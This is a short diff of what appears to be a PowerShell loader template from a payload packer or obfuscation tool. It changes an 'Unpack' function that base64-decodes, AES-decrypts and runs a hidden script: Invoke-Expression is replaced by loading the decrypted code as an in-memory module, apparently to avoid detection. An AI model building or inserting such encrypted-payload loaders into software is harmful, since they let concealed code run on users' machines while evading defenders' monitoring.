@@ -46,5 +46,6 @@ function {{symbol_name("Unpack")}} {
     $Result = [System.Convert]::FromBase64String($args[0])
     $Result = Decrypt-AES $Result $KEY
     $Result = [System.Text.Encoding]::UTF8.GetString($Result)
-    $Result | Invoke-Expression
+    $sb = [Scriptblock]::Create($Result)
+    New-Module -ScriptBlock $sb | Out-Null
 }
